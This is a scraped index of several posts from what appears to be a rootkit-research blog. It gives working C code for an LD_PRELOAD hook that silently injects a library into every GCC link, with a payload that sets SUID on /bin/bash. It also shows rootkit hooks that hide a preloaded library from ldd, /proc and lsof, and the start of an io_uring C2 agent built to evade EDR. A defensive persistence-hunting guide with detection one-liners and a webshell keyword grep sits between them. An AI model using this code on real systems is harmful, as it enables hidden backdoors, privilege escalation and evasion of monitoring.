\u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":"Hello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is LD_PRELOAD Rootkit? Before we begin, we need to understand what an LD_PRELOAD rootkit is.\nIs a type of malware that uses the LD_PRELOAD environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel. Introduction A good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\nHowever a weak point in them is that for those who have created or know about LD_PRELOAD rootkits, you know that they are easy to detect and remove.\nAnd in this post, in addition to learning some techniques to detect an LD_PRELOAD rootkit, we will learn how to hide it, to prevent these detections mentioned in the post from catching it.\nDetecting LD_PRELOAD rootkit Most of the time LD_PRELOAD rootkits can be detected using ldd /bin/ls, like this:\nldd: Provides a list of the dynamic dependencies that a given program needs. It will return the name of the shared library and its location. They can also be found in /proc/[pid]/maps.\n/proc/[pid]/maps: A file containing the currently mapped memory regions and their access permissions. They can also be easily found in /proc/[pid]/map_files/\n/proc/[pid]/map_files/: Shows memory-mapped files. And of course, what you can\u0026rsquo;t miss is checking /etc/ld.so.preload\n/etc/ld.so.preload: File containing a separate list of shared objects to be loaded before the program. You can also check this using lsof.\nlsof: Lists files opened by processes and used with -p , it shows the shared libraries loaded by a specific process. And these are the main ways to detect a shared object, you saw how easy it is, right? And most of the LD_PRELOAD rootkits that I see, do not have a feature to hide from it, and as I am a very curious person, I decided to learn some ways on how to hide it and it is in the next session that we will learn.\nHiding an LD_PRELOAD Rootkit from ldd and /proc I think that for people who know me, they know that I really like hooking the read, and this case will be no different.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*real_read)(int, void *, size_t) = NULL; if (!real_read) { real_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); if (!real_read) { errno = ENOSYS; return -1; } } ssize_t result = real_read(fd, buf, count); if (result \u0026gt; 0) { char *start = (char *)buf; char *end = start + result; char *current = start; size_t new_buf_size = result; char *new_buf = (char *)malloc(new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } size_t new_buf_pos = 0; while (current \u0026lt; end) { char *line_start = current; char *line_end = memchr(current, \u0026#39;\\n\u0026#39;, end - current); if (!line_end) { line_end = end; } else { line_end++; } if (!memmem(line_start, line_end - line_start, \u0026#34;hook.so\u0026#34;, strlen(\u0026#34;hook.so\u0026#34;))) { size_t line_length = line_end - line_start; if (new_buf_pos + line_length \u0026gt; new_buf_size) { new_buf_size = new_buf_pos + line_length; new_buf = (char *)realloc(new_buf, new_buf_size); if (!new_buf) { errno = ENOMEM; return -1; } } memcpy(new_buf + new_buf_pos, line_start, line_length); new_buf_pos += line_length; } current = line_end; } memcpy(buf, new_buf, new_buf_pos); result = new_buf_pos; free(new_buf); } return result; } This code implements a hook in the read function, intercepting file readings and filtering lines that contain the string \u0026quot;hook.so\u0026quot;, using the dlsym function to obtain the original version of read, processing the data read, dynamically allocating memory to store the filtered result and returning this new buffer, while ensuring that any line with \u0026quot;hook.so\u0026quot; is deleted through functions like memm and memchr, effectively \u0026ldquo;hiding\u0026rdquo; the string by copying only the lines that don\u0026rsquo;t contain it to the final buffer.\nTherefore, it is not detected in ldd and by any file/directory in /proc/*.\nExample using ldd:\nExample using /proc/pid/maps:\nExample using /proc/pid/map_files/:\nExample using lsof:\nExample using cat /etc/ld.so.preload:\nThis is a simple solution, nothing too advanced, but it is quite effective.\nHiding from /etc/ld.so.preload As seen previously, the presented technique works, however, if you do cat /etc/ld.so.preload, as expected hook.so will not appear, however, if you use nano, for example, it will be seen there.\nAnd that\u0026rsquo;s bad for us.\nTo do this, we will hook the fopen, read and readdir functions to hide the file /etc/ld.so.preload, making it \u0026ldquo;impossible\u0026rdquo; to open, read or list in directories, and also causing it to be non-existent, for example, if you do a cat /etc/ld.so.preload, it returns No such file or directory.\nHere is a simple code in C:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;errno.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;limits.h\u0026gt; #include \u0026lt;dirent.h\u0026gt; #define HIDDEN_FILE \u0026#34;/etc/ld.so.preload\u0026#34; FILE *(*orig_fopen)(const char *pathname, const char *mode); FILE *fopen(const char *pathname, const char *mode) { if (!orig_fopen) { orig_fopen = dlsym(RTLD_NEXT, \u0026#34;fopen\u0026#34;); } if (strcmp(pathname, HIDDEN_FILE) == 0) { errno = ENOENT; return NULL; } return orig_fopen(pathname, mode); } ssize_t read(int fd, void *buf, size_t count) { static ssize_t (*orig_read)(int, void *, size_t) = NULL; if (!orig_read) { orig_read = dlsym(RTLD_NEXT, \u0026#34;read\u0026#34;); } char path[PATH_MAX]; snprintf(path, sizeof(path), \u0026#34;/proc/self/fd/%d\u0026#34;, fd); char actual_path[PATH_MAX]; ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1); if (len \u0026gt; 0) { actual_path[len] = \u0026#39;\\0\u0026#39;; if (strcmp(actual_path, HIDDEN_FILE) == 0) { errno = ENOENT; return -1; } } return orig_read(fd, buf, count); } struct dirent *(*orig_readdir)(DIR *dirp); struct dirent *readdir(DIR *dirp) { if (!orig_readdir) { orig_readdir = dlsym(RTLD_NEXT, \u0026#34;readdir\u0026#34;); } struct dirent *entry; while ((entry = orig_readdir(dirp)) != NULL) { if (strcmp(entry-\u0026gt;d_name, \u0026#34;ld.so.preload\u0026#34;) != 0) { return entry; } } return NULL; } fopen: This function checks if the file is /etc/ld.so.preload, if so, prevents it from opening by returning NULL and setting the error to ENOENT (No such file or directory), otherwise, it calls the function fopen original to open other files normally. read: Before reading, the function checks whether the file associated with the fd (file descriptor) is /etc/ld.so.preload (using readlink to obtain the actual path of the file), if so, a error on the read, returning -1 and setting the error to ENOENT, otherwise it calls the original read function to read other files normally. readdir: This function reads directory entries and checks if the name of any entry is ld.so.preload, if it finds that name, it ignores the entry and continues the search, otherwise it returns the entry normally, that is, it becomes invisible if you try to read ls -lah /etc/ |grep ld.so.preload. And then, it becomes more \u0026ldquo;stealth\u0026rdquo;.\nChecking if ld.so.preload is listed in /etc/:\nChecking if you can see the contents of /etc/ld.so.preload:\nAnd of course this isn\u0026rsquo;t 100% perfect, but it\u0026rsquo;s cool to understand how this process works.\nPlot Twist Well\u0026hellip; here\u0026rsquo;s a very funny thing, the process of hiding /etc/ld.so.preload, presented in the post becomes useless when we use strace 😂.\nStrace: Diagnostic, debugging and instructional userspace utility for Linux. This does not work against strace, our code cannot hide from it, because it only handles the read function, while strace can also monitor system calls at the kernel level, where the hook.so is still visible.\nFinal consideration I hope you liked this post, and that you learned something from it, if you have any questions, please contact me on Twitter.\n","permalink":"http://localhost:1313/hacking/ldpreload-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a group that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ld_preload-rootkit\"\u003eWhat is LD_PRELOAD Rootkit?\u003c/h2\u003e\n\u003cp\u003eBefore we begin, we need to understand what an \u003ccode\u003eLD_PRELOAD rootkit\u003c/code\u003e is.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIs a type of malware that uses the \u003ccode\u003eLD_PRELOAD\u003c/code\u003e environment variable to load malicious shared libraries. It intercepts and modifies functions, allowing you to hide files, processes and activities. So, an LD_PRELOAD rootkit runs in user space (ring3), because it does not interact directly with the kernel.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eA good point about LD_PRELOAD Rootkit is that, unlike LKM (Loadable Kernel Module), they are much more stable, compatible and are also easier to develop.\u003c/p\u003e","title":"How detect a LD_PRELOAD rootkit and hide from ldd \u0026 /proc"},{"content":" Hello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\nThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\nBelow is what we will cover in this post.\nSSH Keys Crontab Bashrc APT Privileged user \u0026amp; SUID bash Malicious Systemd Hunting LKM Rootkits LD_PRELOAD rootkit PAM Backdoor ACL init.d Motd Mount process for hide any pid. Webshells rc.local But before we start, we need to understand what persistence is.\nWhat is persistence? Persistence in Linux, refers to the ability of malware, such as rootkits, backdoors and we can also abuse common Linux features for malicious uses to remain active on the system even after reboots. These threats seek to maintain unauthorized access and conceal their presence, making them persistent challenges for detection and removal.\nSo now we understand what persistence is, to be able to defend our systems we need to know where to look and how to remove it, so let\u0026rsquo;s go!\nHunting for Malicious SSH Keys It is correct to say that the simplest method of maintaining persistence is using ssh keys, so it is always good before analyzing an infected machine, for example, to see if there is an ssh key that you do not know, you can view it this with just one command line.\nfor home_dir in /home/*; do [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;HOME \\\u0026#34;$(basename \u0026#34;$home_dir\u0026#34;)\\\u0026#34;\u0026#34;; [ -d \u0026#34;$home_dir/.ssh\u0026#34; ] \u0026amp;\u0026amp; cat \u0026#34;$home_dir\u0026#34;/.ssh/*; done ls -la -R /home/*/.ssh */.ssh/* With this, the attacker could simply add his public key to the authorized_keys of some home or get the private key, and return to the machine at any time, and whenever he wants without needing a password.\nHunting for crontab persistence. Persistence via crontab is also a very old persistence technique, but it is still used today, basically, crontab allows us to schedule commands, scripts and programs to be executed automatically at regular intervals of time, and with that we can simply schedule a cron to execute a malicious script or some command, below are some examples.\nIn this image we see a classic example of persistence using crontab, where the 5 asterisks represent that our task will be executed every 1 minute, under the root user and then we enter the path of our script.\nPaths for search cron persistence\ncat /etc/crontab ls -la /var/spool/* ls -la -R /var/cron* Hunting for bashrc persistence .bashrc is a script file used in Linux Bash to configure environment variables, aliases, and other terminal customizations. Thinking like an attacker, you could make a malicious alias so that when the victim runs a command, for example the ls command, it sends you a reverse shell, executes a script, among many others.\nYou can search using this command:\ncat /home/*/{.bashrc,.zshrc} ls -la /home/*/{.bashrc,.zshrc} Hunting APT command persistence In short, apt is a program package management system that has automatic resolution of dependencies between packages, easy package installation method, ease of operation, allows you to easily update your distribution, etc.\nBut until then there is nothing \u0026ldquo;malicious\u0026rdquo;, however, apt has a command called apt update, which is for updating packages, and it also has a directory in: /etc/apt/apt.conf.d.\nThe /etc/apt/apt.conf.d directory is used to manage apt specific configurations on the operating system.\nBut what if we can create a malicious configuration to be able to send a reverse shell to us every time someone uses the apt update command, yes, this is totally possible, below are some examples.\nYou can use this command to find and check them one by one.\nls -la -R /etc/apt/apt.conf.d Hunting for Privileged user \u0026amp; SUID bash In a real attack scenario, depending on the attacker can also put SUID permissions on binaries, for example bash to be able to use it with root permission, and also add a user so that he can use sudo su and be root without having to password by changing the file /etc/sudoers.\nScenario 1 Scenario 2 You can check using these commands below:\nfind / -perm /4000 2\u0026gt;/dev/null #for search suid binaries/files ls -la $(whereis bash) ls -la /etc/sudoers.d cat /etc/sudoers cat /etc/groups #Here you can also check if a user is in the wrong group Hunting for malicious systemd service Systemd is a startup and service management system it simplifies system startup and service management.\nA malicious attacker abuses systemd to create a malicious service, for example, to send a reverse shell every 1 minute.\nPersistence by a service in systemd, it is widely used, it is always good to see what services you have on your machine, a tip for this type of situation is to use pspy64 which is basically a real-time process monitor, and when a service in systemd for example is executed, it appears in pspy too, and the same goes for crontab.\nHere are some directories you can check:\nls -la /etc/systemd/system ls -la /lib/systemd/system ls -la /run/systemd/system ls -la /usr/lib/systemd/system ls -la /home/*/.config/systemd/user/ To stop the malicious service, simply run the commands:\nsystemctl stop malicious.service systemctl disable malicious.service rm malicious.service Hunting for Loadable kernel module Rootkits LKM (Loadable kernel module) rootkits are certainly an absurd challenge to hunt, as it simply hides, becomes invisible, and once it is invisible it is almost impossible to remove it, in technical details, rootkits use a function called list_del which basically removes from lsmod (list modules) that is capable of listing the machine\u0026rsquo;s kernel modules, the big problem with this is that rmmod (remove module) is not capable of removing a module that is not in lsmod, so rootkits are very efficient at remaining persistent without anyone being able to detect why this is one of the main objectives of a rootkit, to remain persistent and invisible, but in this part of the post, I will teach you some techniques that can help you find rootkits and detect them, however, as stated above, removing them is a difficult task and depends on the type of rootkit, if it is one you can find on github like for example diamorphine, it has the function of becoming visible again, and then you can remove it.\nAs you can see here, it is invisible and even if it is still in the system, you will not be able to remove it.\nBut diamorphine was also designed to be visible, by default which is by using kill -63 0 and then you can remove it.\nHunting without tools I will use the diamorphine rootkit as an example to do hunting.\nThe most basic thing to do when a rootkit is not in lsmod is to check the kernel log files, such as:\ndmesg /var/log/kern.log /var/log/dmesg* It is very important to view the kernel logs because when an LKM is entered, it generates logs there as well.\nWe can also view: /sys/kernel/tracing/available_filter_functions which is basically a feature in Linux that lists the functions available to filter events during kernel tracing.\nWe can also view all available functions with their respective addresses /sys/kernel/tracing/available_filter_functions_addrs\nIt is also very important that we check the files and commands:\n/proc/modules /proc/kallsyms /lib/modules /proc/* lsmod #to view modules ps aufwx #to view all process in machine ss -tunlpd #to view connections lsof -i -P -n #to view process in execution and file open /proc/*/maps /proc/*/cwd /proc/*/environ Hunting with tools Unhide I\u0026rsquo;ll start using unhide which is a forensic tool to find processes and TCP/UDP ports hidden by rootkits, Linux kernel modules or by other techniques.\nAs we can see in the image above, we hid a PID, and using unhide, we were able to find it.\nRkhunter (rootkit hunter) Rkhunter is a good tool, however it is based on known signatures/strings, that is, if you modify the functions you can easily bypass its detection, you can see this video using the D3m0n1z3dShell tool for this.\nHowever, for known rootkits and if they are inserted by default without any modification, rkhunter can easily detect them, in the case of diamorphine and other rootkits, if it is invisible to lsmod, depending on it it cannot detect it, which is the case with diamorphine, if I make the module visible, it detects it, otherwise it goes unnoticed.\nNow with the rootkit hidden again:\nHere is the log that rkhunter generates, and basically for it to detect if it really is the diamorphine rootkit, it uses signature/strings which is clearly very easy to bypass detection.\nThis is enough to avoid detection.\nAgain, rkhunter is good for rootkits that have not been modified and signature/strings already exist, but still, don\u0026rsquo;t trust it 100%.\nchkrootkit Chkrootkit is a rootkit detection tool on Unix-like systems. It scans the system for signs of malicious activity such as suspicious files, hidden processes, and modifications to system libraries.\nChkrootkit is good at detecting hidden processes and directory as well, but as mentioned on rkhunter, don\u0026rsquo;t trust chkrootkit 100% as it is still possible to avoid detection of an LKM rootkit.\nTracee EBPF Tracee is a runtime security and observability tool that helps you understand how your system and applications behave. Tracee uses eBPF, and it is a great forensics tool, in my opinion it is the best there is for detecting rootkits as well, as it also detects if a syscall has been hooked.\nOBS: To disable LKM insertion you can use sysctl for this:\nsudo sysctl -w kernel.modules_disabled=1 To return it to default, simply change the 1 to 0.\nHere are some talks and posts about tracee detecting LKM rootkits, it\u0026rsquo;s really worth watching!\nDetecting Linux Syscall Hooking Using Tracee\nBlackHat Arsenal 2022: Detecting Linux kernel rootkits with Aqua Tracee\neBPF Warfare - Detecting Kernel \u0026amp; eBPF Rootkits with Tracee\nHunting kernel rootkits with eBPF by Asaf Eitani \u0026amp; Itamar Maouda Kochavi\nBônus tools:\nLynis is a security auditing tool Tiger is a security audit tool #sudo apt install tiger -y Volatily #advanced memory forensics Hunting LD_PRELOAD Rootkits LD_PRELOAD rootkits are easier to hunt down and remove from the machine, because basically besides being Userland, most of them involve the use of shared object (*.so)\nIn this part, I will use a userland rootkit created by h0mbre\nSome LD_PRELOAD rootkits hide from /etc/ld.so.preload but it is possible to find it anyway.\nTo be able to confirm, it is always a good idea to check the binaries with ldd to see which shared objects it has.\nTo remove it, it\u0026rsquo;s very simple.\nAnd that\u0026rsquo;s it, it has already been removed from the machine.\nAs said, userland rootkits are much easier to detect and remove, below are some directories/files that are good to check.\n/lib/x86_64-linux-gnu /lib/* /usr/lib/x86_64-linux-gnu /usr/lib/* ls -la /etc/ld* cat /etc/ld.so.preload ldd /bin/ls ldd /bin/bash ldd /usr/bin/ssh ldd /usr/bin/netstat ldd /bin/* #check for shared object in binary, which you suspect ldd /usr/bin/* #check for shared object in binary, which you suspect /proc/*/maps Using volatily also helps a lot in this analysis process.\nHunting for PAM Backdoor PAM Backdoor is a well-known persistence technique, it works by manipulating the Pluggable Authentication Modules (PAM) authentication system. This allows unauthorized access to the system by granting a specific user privileged access regardless of correct credentials.\nI will use this repository that automates this persistence process.\nNow that the PAM Backdoor has been inserted, let\u0026rsquo;s search for it.\nOne thing we can do to detect something \u0026ldquo;abnormal\u0026rdquo; in it is to use strings, I downloaded a Normal Linux PAM on my machine and compiled it.\nMalicious pam_unix.so Here we\u0026rsquo;ll see in the strings that the password we used is there, called \u0026ldquo;hunt3r\u0026rdquo; on line 376, so we can do the same thing, look on lines 375 to 378 or so and see if there\u0026rsquo;s anything there.\nNormal pam_unix.so And now in the uninfected pam_unix.so, there is nothing interesting in these lines, so in an infected pam_unix.so, if you use the strings and analyze it, you will see the password that is used for unauthorized access\ncat /usr/include/type.h find / -name \u0026#34;pam_unix.so\u0026#34; 2\u0026gt;/dev/null ls -la /lib/security ls -la /usr/lib/security ls -la /lib/x86_64-linux-gnu/security ls -la /etc/pam.d/* Here are two repository links on github that automate persistence, you can read the code and understand it, maybe look for other ways to hunt.\nmadlib\nLinux PAM Backdoor\nHunting for ACL Persistence Just like in Active Directory/Windows, in Linux there is also an ACL, and this can be used to maintain persistence as well.\nIn a scenario where an attacker has compromised one of your Linux machines and knows that at any time he may lose access to the machine or a specific directory/file, he can abuse the ACL (access control list) by using the setfacl command to change Control access to a file or directory for any user you want, with whatever permissions you want.\nNow the user kali can access /root even without being root, because we changed the ACL of the /root directory for the user kali be able to have read, write and execute permissions.\nTo be able to do a hunt, it\u0026rsquo;s very simple, just use the command getfacl which basically displays the access control lists (ACLs) associated with files and directories and then use setfacl -b DIR/FILE for remove ACL.\nWe can also create a simple bash script to run and whatever it finds in ACL it will print on the screen.\n#!/bin/bash users=$(awk -F\u0026#39;:\u0026#39; \u0026#39;$1!=\u0026#34;root\u0026#34; {print $1}\u0026#39; /etc/passwd) check_acl_for_user() { local user=\u0026#34;$1\u0026#34; echo \u0026#34;Checking ACLs for user: $user\u0026#34; acl_output=$(getfacl -R /* | grep \u0026#34;^# file: \\|user:$user$\u0026#34;) if [[ -n \u0026#34;$acl_output\u0026#34; ]]; then echo \u0026#34;$acl_output\u0026#34; fi } for user in $users; do check_acl_for_user \u0026#34;$user\u0026#34; done Hunting init.d persistence init.d are the scripts that are executed at machine startup, that is, as soon as the machine is turned on, the scripts that are on it are executed, and this is like gold for an attacker, as he can simply add a reverse shell payload, or execute any script he wants, as soon as the machine starts/restarts.\nNow after reboot:\nTo remove it is quite simple.\nFor hunting just check these two directories:\nls -la /etc/init.d/* ls -la /etc/rc*.d/ Hunting MOTD Persistence MOTD (Message of the Day) is a message displayed to users when they log into a system, usually through SSH or the console. It is a way of providing important information, such as maintenance notices, usage policies, system news or any other relevant information to users.\nThis persistence technique basically consists of creating a malicious MOTD that when someone join into the machine using ssh for example, our Malicious MOTD will be executed, below is an example of how it works.\nBasically what we did was go to /etc/update-motd.d and create a new MOTD containing the path of a reverse shell script, so that as soon as someone sshs in, the reverse shell will be executed and Regardless of which user you enter, the shell will always be root, as ssh runs as root.\nTo be able to hunt you can check these directories looking for an Abnormal MOTD.\nls -la /etc/update-motd.d/* /usr/lib/update-notifier/update-motd-updates-available cat /etc/motd find / -name \u0026#34;*motd*\u0026#34; 2\u0026gt;/dev/null Hunting for hidden process mounted This technique of using mount to mount a process in another directory is quite old, but it\u0026rsquo;s worth knowing how it works and knowing how to undo it.\nTo be able to hunt, it\u0026rsquo;s very simple, just use the mount command to see what is mounted.\nmount mount|grep proc umount /proc/PID umount -l /proc/PID Hunting for webshells Of course, using webshells for persistence is an old technique. When an attacker gains access to a machine, even without elevated privileges, they can deploy a webshell. A webshell allows the attacker to access the machine, even without direct access to the server via browser/web and from there, the attacker can execute commands and even execute a reverse shell to gain access to the server without depending on the webshell.\nHere we have an example of a simple webshell in PHP.\nWe can detect it using this oneline and with tools too.\ngrep -rlE \u0026#39;fsockopen|pfsockopen|exec|shell|system|eval|rot13|base64|base32|passthru|\\$_GET|\\$_POST\\$_REQUEST|cmd|socket\u0026#39; /var/www/html/*.php | xargs -I {} echo \u0026#34;Suspicious file: {}\u0026#34; We can also look at the apache logs, it also shows what the file was.\nWe can also use tools like BackDoorMan, NeoPI, Shell-Detector and WebShell-AIHunter that help in detecting malicious webshells.\nHunting rc.local persistence rc.local is a startup script in Linux used to execute custom commands or scripts during the system boot process, however it has been replaced by more modern methods such as systemd service units.\nAn attacker could add a reverse shell to /etc/rc.local and every time your machine is started, the content on it will be executed with root privileges, thus providing very good and effective persistence.\nAfter the reboot, the content inside rc.local which was the reverse shell was executed successfully and we can see its process.\nWe can also see when it was run using systemctl status rc-local.\nTo be able to hunt, just check these files and directories:\n/etc/rc.local /lib/systemd/system/rc-local.service.d cat /run/systemd/generator/multi-user.target.wants/rc-local.service systemctl status rc-local So this was the post, I hope you liked it, if you have any questions or if you didn\u0026rsquo;t understand any part, DM me on Twitter: @MatheuzSecurity\nSo that\u0026rsquo;s it, until next time!\n","permalink":"http://localhost:1313/hacking/linux-threat-hunting-persistence/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/lM0kWBM.jpeg\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eHello everyone, welcome to this post, where I will cover the topic “Linux Threat Hunting Persistence”.\u003c/p\u003e\n\u003cp\u003eThe objective of this post is to learn how to hunt for persistence on Linux machines, without using paid tools/framework, just using the tools that are already available (open source) for anyone to download and use and also using Linux\u0026rsquo;s own resources to be able to do hunt for persistence.\u003c/p\u003e\n\u003cp\u003eBelow is what we will cover in this post.\u003c/p\u003e","title":"Linux Threat Hunting Persistence"},{"content":"Full source: https://github.com/MatheuZSecurity/RingReaper\nTable of Contents Introduction What is io_uring? The Agent Code Analysis How Does the EDR Typically Fail Here? Practical EDR Bypass Python C2 Server Flow Defensive Reflections Conclusion Introduction Each year, new security solutions emerge to protect Linux systems against increasingly sophisticated threats. Technologies such as EDR (Endpoint Detection and Response) evolve rapidly, making the work of an attacker more challenging.\nWe, as red teamers, we need to stay one step ahead, seeking to understand not only the defenses, but also how to creatively circumvent them.\nIn this article, I will explore the use of io_uring, a legitimate Linux kernel feature designed for high-performance asynchronous I/O, but which can be adapted to evade traditional syscall-based detection mechanisms. We will see how modern techniques can enable stealthy and silent operations, bypassing EDR and other monitoring mechanisms, and what this means for both attackers and defenders.\nWhat is io_uring? io_uring was introduced in Linux starting from kernel 5.1. It provides a highly performant model for asynchronous I/O operations, using submission and completion rings. In other words:\nThe process places I/O requests into a queue shared with the kernel The kernel executes them when it can, without blocking the user thread The result comes back through another completion ring The critical point is that this model allows for multiple operations (opening a file, sending data, reading from a socket, etc.) without the typical sequence of blocking syscalls that most EDRs monitor. Instead of repeatedly calling read, write, send, connect, everything happens through io_uring_submit() and mapped buffers.\nThe Agent This agent essentially acts as a \u0026ldquo;backdoor\u0026rdquo;, though it\u0026rsquo;s not persistent yet, at the time of writing, persistence modules haven\u0026rsquo;t been implemented. However, they will be added in the future. The agent connects to a server (C2) controlled by the attacker and accepts commands. It was designed with:\nNetwork communication using io_uring_prep_send and io_uring_prep_recv File reading via io_uring_prep_openat and io_uring_prep_read File upload without explicit write or read syscalls Post-exploitation command execution (listing users, processes, connections, etc.) Self-deletion (self-destruct) that removes its own binary using io_uring_prep_unlinkat On the Python-based C2 server, an operator sends interactive commands, and the agent responds discreetly.\nCode analysis of the agent send_all\nint send_all(struct io_uring *ring, int sockfd, const char *buf, size_t len) { size_t sent = 0; while (sent \u0026lt; len) { struct io_uring_sqe *sqe = io_uring_get_sqe(ring); io_uring_prep_send(sqe, sockfd, buf + sent, len - sent, 0); io_uring_submit(ring); struct io_uring_cqe *cqe; io_uring_wait_cqe(ring, \u0026amp;cqe); int ret = cqe-\u0026gt;res; io_uring_cqe_seen(ring, cqe); if (ret \u0026lt;= 0) return ret; sent += ret; } return sent; } This function ensures that a complete buffer is sent by a socket using 